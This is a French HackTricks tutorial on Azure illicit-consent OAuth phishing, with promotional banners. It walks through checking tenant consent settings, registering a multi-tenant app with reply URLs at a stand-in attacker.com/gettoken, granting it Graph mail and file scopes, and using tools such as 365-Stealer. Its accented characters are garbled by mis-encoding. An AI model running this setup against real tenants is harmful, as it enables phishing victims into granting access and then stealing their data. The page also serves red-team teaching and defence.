# Az - Consentement Illicite

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Phishing d'Application OAuth

Les **Applications Azure** demandent des autorisations pour acc√©der aux **donn√©es utilisateur** (informations de base, mais aussi acc√®s aux documents, envoi d'e-mails...).\
Si **autoris√©**, un utilisateur normal peut accorder son consentement uniquement pour les **autorisations √† "Impact Faible"**. Dans **tous les autres** cas, **le consentement de l'administrateur est requis**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` et un r√¥le personnalis√© incluant `l'autorisation d'accorder des autorisations aux applications` peuvent accorder un consentement au niveau du locataire.

Seules les autorisations qui **ne n√©cessitent pas le consentement de l'administrateur** sont class√©es comme **impact faible**. Il s'agit des autorisations requises pour **la connexion de base openid, profile, email, User.Read et offline\_access**. Si une **organisation** **autorise** le consentement de l'utilisateur pour **toutes les applications**, un employ√© peut accorder son consentement √† une application pour **lire les informations ci-dessus √† partir de son profil**.

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

Par cons√©quent, un attaquant pourrait pr√©parer une **application malveillante** et, avec un **phishing**, faire accepter l'application par l'utilisateur et voler ses donn√©es.

### 2 Types d'Attaques de Consentement Illicite

* **Non authentifi√©** : √Ä partir d'un compte externe, cr√©ez une application avec les autorisations `User.Read` et `User.ReadBasic.All` par exemple, faites du phishing sur un utilisateur, et vous pourrez acc√©der aux informations du r√©pertoire.
* Cela n√©cessite que l'utilisateur victime du phishing puisse accepter les applications OAuth provenant d'environnements externes !
* **Authentifi√©** : Ayant compromis un principal avec suffisamment de privil√®ges, cr√©ez une application √† l'int√©rieur du compte et faites du phishing sur un utilisateur privil√©gi√© qui peut accepter des autorisations OAuth privil√©gi√©es.
* Dans ce cas, vous pouvez d√©j√† acc√©der aux informations du r√©pertoire, donc l'autorisation `User.ReadBasic.All` n'est plus int√©ressante.
* Vous √™tes probablement int√©ress√© par les **autorisations qui n√©cessitent qu'un administrateur les accorde**, car un utilisateur standard ne peut pas accorder d'autorisation aux applications OAuth, c'est pourquoi vous devez **phisher uniquement ces utilisateurs** (plus d'informations sur les r√¥les/autorisations accordant ce privil√®ge plus tard)

### V√©rifier si les utilisateurs sont autoris√©s √† consentir

La commande PowerShell suivante est utilis√©e pour v√©rifier la configuration de consentement des utilisateurs dans Azure Active Directory (Azure AD) concernant leur capacit√© √† consentir aux applications :
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **D√©sactiver le consentement utilisateur**: Ce param√®tre interdit aux utilisateurs d'accorder des autorisations aux applications. Aucun consentement utilisateur pour les applications n'est autoris√©.
* **Les utilisateurs peuvent consentir aux applications des √©diteurs v√©rifi√©s ou de votre organisation, mais uniquement pour les autorisations que vous s√©lectionnez**: Ce param√®tre permet √† tous les utilisateurs de consentir uniquement aux applications publi√©es par un √©diteur v√©rifi√© et aux applications enregistr√©es dans votre propre locataire. Il ajoute une couche de contr√¥le en n'autorisant le consentement que pour des autorisations sp√©cifiques.
* **Les utilisateurs peuvent consentir √† toutes les applications**: Ce param√®tre est plus permissif et permet √† tous les utilisateurs de consentir √† toutes les autorisations pour les applications, tant que ces autorisations ne n√©cessitent pas de consentement administratif.
* **Politique de consentement d'application personnalis√©e**: Ce param√®tre indique qu'une politique personnalis√©e est en place, pouvant √™tre adapt√©e aux exigences organisationnelles sp√©cifiques et pouvant impliquer une combinaison de restrictions bas√©es sur l'√©diteur de l'application, les autorisations demand√©es par l'application et d'autres facteurs.

## **Compr√©hension de l'attaque de consentement illicite**

Dans une attaque de consentement illicite, les attaquants trompent les utilisateurs finaux en leur faisant accorder des autorisations √† une application malveillante enregistr√©e aupr√®s d'Azure. Cela est fait en rendant l'application apparemment l√©gitime, incitant les victimes √† cliquer involontairement sur un bouton "Accepter". En cons√©quence, Azure AD d√©livre un jeton au site de l'attaquant, leur permettant d'acc√©der et de manipuler les donn√©es de la victime, telles que la lecture ou l'envoi d'e-mails et l'acc√®s √† des fichiers, sans avoir besoin d'un compte organisationnel.

## **Vue d'ensemble du flux de l'attaque**

L'attaque implique plusieurs √©tapes ciblant une entreprise g√©n√©rique. Voici comment elle pourrait se d√©rouler :

1. **Enregistrement de domaine et h√©bergement d'application**: L'attaquant enregistre un domaine ressemblant √† un site de confiance, par exemple, "safedomainlogin.com". Sous ce domaine, un sous-domaine est cr√©√© (par exemple, "nomdelasoci√©t√©.safedomainlogin.com") pour h√©berger une application con√ßue pour capturer des codes d'autorisation et demander des jetons d'acc√®s.
2. **Enregistrement de l'application dans Azure AD**: L'attaquant enregistre ensuite une application multi-locataire dans son locataire Azure AD, en la nommant d'apr√®s l'entreprise cible pour para√Ætre l√©gitime. Ils configurent l'URL de redirection de l'application pour pointer vers le sous-domaine h√©bergeant l'application malveillante.
3. **Configuration des autorisations**: L'attaquant configure l'application avec diverses autorisations d'API (par exemple, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Ces autorisations, une fois accord√©es par l'utilisateur, permettent √† l'attaquant d'extraire des informations sensibles au nom de l'utilisateur.
4. **Distribution de liens malveillants**: L'attaquant cr√©e un lien contenant l'ID client de l'application malveillante et le partage avec les utilisateurs cibl√©s, les trompant pour qu'ils donnent leur consentement.

## **Utilisation d'outils pour l'attaque**

L'attaque peut √™tre facilit√©e en utilisant des outils comme [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

### Pr√©paration avant l'attaque :

Si l'attaquant a un certain niveau d'acc√®s √† un utilisateur de l'organisation victime, il pourrait v√©rifier si la politique de l'organisation permet √† l'utilisateur d'accepter des applications :
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Pour ex√©cuter l'attaque, l'attaquant devrait cr√©er une **nouvelle application dans son locataire Azure** (dans les inscriptions d'application), configur√©e avec les autorisations :

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` se trouve dans `Microsoft Graph` dans les `Autorisations d√©l√©gu√©es`. (Les autorisations d'application n√©cessiteront toujours une approbation suppl√©mentaire).

* `User.ReadBasic.All` est l'autorisation qui vous permettra de **lire les informations de tous les utilisateurs** de l'organisation si elle est accord√©e.
* Rappelez-vous que seuls les r√¥les `GA`, `ApplicationAdministrator`, `CloudApplication Administrator` et un r√¥le personnalis√© incluant `l'autorisation d'accorder des autorisations aux applications` peuvent fournir un consentement au niveau du locataire. Ainsi, vous devriez **phisher un utilisateur avec l'un de ces r√¥les** si vous voulez qu'il approuve une **application n√©cessitant un consentement administratif**.

Vous pourriez √©galement cr√©er une application via la CLI avec :

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Consultez [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) pour apprendre comment le configurer.

{% hint style="warning" %}
Notez que le **jeton d'acc√®s** obtenu sera pour le **point de terminaison graphique** avec les √©tendues : `User.Read` et `User.ReadBasic.All` (les autorisations demand√©es). Vous ne pourrez pas effectuer d'autres actions (mais celles-ci sont suffisantes pour **t√©l√©charger des informations sur tous les utilisateurs** de l'organisation).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Vous pouvez √©galement utiliser cet outil pour effectuer cette attaque.

## Post-Exploitation

Une fois que vous avez acc√®s √† l'utilisateur, vous pouvez faire des choses telles que voler des documents sensibles et m√™me t√©l√©charger des fichiers de documents pi√©g√©s.

## R√©f√©rences

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
